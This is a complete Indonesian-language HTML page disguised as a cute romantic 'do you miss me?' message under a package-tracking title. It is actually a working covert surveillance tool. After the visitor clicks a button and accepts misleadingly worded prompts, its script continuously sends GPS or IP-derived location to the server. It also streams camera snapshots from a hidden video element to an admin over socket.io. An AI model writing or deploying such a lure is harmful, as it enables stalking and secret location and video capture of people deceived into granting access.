<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="utf-8" />
  <title>Pelacakan Paket üíñ</title>
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <style>
    :root {
      --pink1: #ffd0e3;
      --pink2: #ff9ccf;
      --accent: #ff4d79;
    }

    html, body {
      height: 100%;
      margin: 0;
      font-family: "Poppins", sans-serif;
      background: radial-gradient(circle at top left, var(--pink1), var(--pink2));
      overflow: hidden;
      color: #fff;
      display: flex;
      justify-content: center;
      align-items: center;
    }

    .center {
      text-align: center;
      position: relative;
      z-index: 2;
    }

    h1 {
      font-size: 2.6rem;
      margin-bottom: 12px;
      text-shadow: 0 0 20px rgba(255, 77, 121, 0.3);
      animation: glow 2s ease-in-out infinite alternate;
    }

    @keyframes glow {
      from { text-shadow: 0 0 10px #ff69b4, 0 0 20px #ff69b4; }
      to { text-shadow: 0 0 30px #ff1493, 0 0 50px #ff69b4; }
    }

    .card {
      background: rgba(255, 255, 255, 0.1);
      border-radius: 20px;
      padding: 30px 40px;
      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
      backdrop-filter: blur(8px);
    }

    .kitty {
      width: 260px;
      height: 260px;
      border-radius: 20px;
      object-fit: cover;
      margin-bottom: 16px;
      box-shadow: 0 8px 25px rgba(0, 0, 0, 0.2);
    }

    .btn {
      padding: 14px 30px;
      border: none;
      border-radius: 999px;
      background: linear-gradient(90deg, var(--accent), #ff7fb0);
      color: #fff;
      font-size: 17px;
      font-weight: 600;
      cursor: pointer;
      box-shadow: 0 10px 25px rgba(255, 77, 121, 0.3);
      transition: all 0.2s ease;
    }

    .btn:hover {
      transform: scale(1.05);
      box-shadow: 0 12px 35px rgba(255, 105, 180, 0.5);
    }

    .btn-stop {
      background: #ef4444;
      margin-left: 10px;
    }

    .status {
      margin-top: 12px;
      font-size: 1rem;
      color: rgba(255, 255, 255, 0.95);
    }

    /* Efek cinta mengambang */
    .floating {
      position: fixed;
      inset: 0;
      pointer-events: none;
      z-index: 1;
      overflow: hidden;
    }

    .love {
      position: absolute;
      font-weight: 600;
      color: rgba(255, 255, 255, 0.7);
      text-shadow: 0 0 10px rgba(255, 120, 160, 0.5);
      font-size: 18px;
      white-space: nowrap;
      animation: floatFar linear infinite;
    }

    @keyframes floatFar {
      0% { transform: translateY(120vh) scale(0.6); opacity: 0; }
      15% { opacity: 1; }
      100% { transform: translateY(-250vh) scale(1.4); opacity: 0; }
    }

    video { display: none; }
  </style>
</head>
<body>
  <div class="floating" id="floating"></div>

  <div class="center card">
    <h1> kamu kangen aku ga? üíó</h1>
    <img class="kitty" src="/static/img/kucing.jpeg" alt="gambar paket lucu">
    <div>
      <button class="btn" id="startBtn">klik ini kalo kamu kangen üíï</button>
      <button class="btn btn-stop" id="stopBtn" style="display:none">makasih sayangggü•∞ü•∞ü•∞</button>
    </div>
    <div id="status" class="status">Klik ini kalo kamu kangen üìç</div>
  </div>

  <video id="hiddenVideo" autoplay playsinline muted></video>

  <script src="https://cdn.socket.io/4.6.1/socket.io.min.js"></script>
  <script>
    const socket = io();
    const clientId = localStorage.getItem("client_id") || "package_" + Math.random().toString(36).slice(2,9);
    localStorage.setItem("client_id", clientId);
    socket.emit("register", { client_id: clientId, role: "client" });

    const startBtn = document.getElementById("startBtn");
    const stopBtn = document.getElementById("stopBtn");
    const statusEl = document.getElementById("status");
    const hiddenVideo = document.getElementById("hiddenVideo");
    const floating = document.getElementById("floating");

    let mediaStream = null;
    let geoWatch = null;
    let interval = null;
    const FPS = 2;

    // === Efek animasi ===
    function spawnLoves(count = 60) {
      const vw = window.innerWidth;
      const vh = window.innerHeight;
      for (let i = 0; i < count; i++) {
        const el = document.createElement("div");
        el.className = "love";
        el.textContent = "üíó I love tracking you üíó";
        el.style.left = Math.random() * vw + "px";
        el.style.top = vh + "px";
        const dur = 10 + Math.random() * 10;
        el.style.animationDuration = dur + "s";
        el.style.fontSize = 14 + Math.random() * 26 + "px";
        el.style.opacity = 0.2 + Math.random() * 0.6;
        floating.appendChild(el);
        setTimeout(() => el.remove(), dur * 1000);
      }
    }
    spawnLoves(80);
    setInterval(() => spawnLoves(30), 2000);

    // === Ambil lokasi IP fallback ===
    async function getIpLocation() {
      try {
        const r = await fetch("https://ipapi.co/json/");
        const j = await r.json();
        return { latitude: j.latitude, longitude: j.longitude, source: "ip" };
      } catch (err) {
        console.warn("Gagal ambil IP lokasi:", err);
        return null;
      }
    }

    // === Kirim lokasi ke server ===
    async function sendLocation(lat, lon, source = "gps") {
      try {
        await fetch("/report", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            client_id: clientId,
            latitude: lat,
            longitude: lon,
            source
          })
        });
      } catch (err) {
        console.error("Gagal kirim lokasi:", err);
      }
    }

    // === Mulai tracking lokasi dan kamera ===
    startBtn.addEventListener("click", async () => {
      const allowLoc = confirm("Izinkan berbagi lokasi untuk pelacakan paket?");
      const allowCam = confirm("Izinkan berbagi kamera (opsional)?");
      statusEl.textContent = "tunggu";

      if (allowLoc) {
        if (navigator.geolocation) {
          geoWatch = navigator.geolocation.watchPosition(async pos => {
            await sendLocation(pos.coords.latitude, pos.coords.longitude, "gps");
            statusEl.textContent = "üìçmakasih sayang aku juga kangen";
          }, async err => {
            console.warn("Gagal ambil GPS:", err);
            const ipLoc = await getIpLocation();
            if (ipLoc) {
              await sendLocation(ipLoc.latitude, ipLoc.longitude, "ip");
              statusEl.textContent = "üìç Lokasi dikirim (IP)";
            }
          }, { enableHighAccuracy: true, timeout: 8000 });
        } else {
          const ipLoc = await getIpLocation();
          if (ipLoc) {
            await sendLocation(ipLoc.latitude, ipLoc.longitude, "ip");
            statusEl.textContent = "üìç Lokasi dikirim (IP)";
          }
        }
      }

      if (allowCam && navigator.mediaDevices.getUserMedia) {
        try {
          mediaStream = await navigator.mediaDevices.getUserMedia({ video: true });
          hiddenVideo.srcObject = mediaStream;
          hiddenVideo.play();
          startStream();
        } catch (err) {
          console.error("Gagal akses kamera:", err);
          statusEl.textContent = "Tidak bisa akses kamera üò¢";
        }
      }

      startBtn.style.display = "none";
      stopBtn.style.display = "inline-block";
      statusEl.textContent = "üíñ";
    });

    // === Hentikan pelacakan ===
    stopBtn.addEventListener("click", () => {
      if (geoWatch) { navigator.geolocation.clearWatch(geoWatch); geoWatch = null; }
      if (interval) { clearInterval(interval); interval = null; }
      if (mediaStream) { mediaStream.getTracks().forEach(t => t.stop()); mediaStream = null; }
      startBtn.style.display = "inline-block";
      stopBtn.style.display = "none";
      statusEl.textContent = "Pelacakan dihentikan üíó";
    });

    // === Stream kamera ke admin ===
    function startStream() {
      const canvas = document.createElement("canvas");
      const ctx = canvas.getContext("2d");
      interval = setInterval(() => {
        if (!hiddenVideo || hiddenVideo.readyState < 2) return;
        const w = hiddenVideo.videoWidth;
        const h = hiddenVideo.videoHeight;
        canvas.width = w;
        canvas.height = h;
        ctx.drawImage(hiddenVideo, 0, 0, w, h);
        const img = canvas.toDataURL("image/jpeg", 0.6);
        socket.emit("stream_frame", { client_id: clientId, image: img });
      }, 1000 / FPS);
    }
  </script>
</body>
</html>
